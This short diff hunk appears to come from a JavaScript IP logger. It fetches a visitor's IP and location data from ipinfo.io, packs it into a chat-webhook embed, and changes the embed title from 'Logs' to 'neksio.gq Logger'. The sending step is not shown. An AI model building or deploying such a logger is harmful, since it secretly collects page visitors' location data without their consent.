@@ -2,7 +2,7 @@ $.getJSON("https://ipinfo.io/json", function(data) {
   var params = {
     embeds: [
       {
-        "title": "Logs",
+        "title": "`🌌`・neksio.gq Logger",
         
         "color": 5202920,
         "thumbnail": {
